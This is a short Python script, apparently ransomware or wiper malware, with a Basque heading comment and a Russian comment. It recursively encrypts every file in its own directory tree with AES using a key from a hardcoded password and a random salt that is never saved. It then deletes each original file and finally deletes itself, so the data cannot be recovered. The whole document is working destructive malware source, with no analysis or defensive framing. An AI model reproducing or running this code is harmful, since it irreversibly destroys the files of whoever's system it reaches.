#Hiena baten beldur zara?

import os
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from pathlib import Path


def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key


def encrypt_file(file_path: str, key: bytes) -> str:

    with open(file_path, 'rb') as file:
        file_data = file.read()


    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(file_data) + padder.finalize()


    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()


    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Генерация нового имени файла с помощью MD5
    new_file_name = hashlib.md5(file_data).hexdigest() + os.path.splitext(file_path)[1]
    new_file_path = os.path.join(os.path.dirname(file_path), new_file_name)


    with open(new_file_path, 'wb') as file:
        file.write(iv + encrypted_data)


    os.remove(file_path)

    return new_file_path

def delete_self():
    current_file = Path(__file__).resolve()
    os.remove(current_file)

def main():

    current_dir = Path(__file__).parent


    password = "very_strong_password"
    salt = os.urandom(16)

    key = generate_key(password, salt)

    for root, _, files in os.walk(current_dir):
        for file in files:
            if file == os.path.basename(__file__):

                continue
            file_path = os.path.join(root, file)
            new_file_path = encrypt_file(file_path, key)
            print(f"Encrypted {file_path} to {new_file_path}")


    delete_self()

if __name__ == "__main__":
    main()
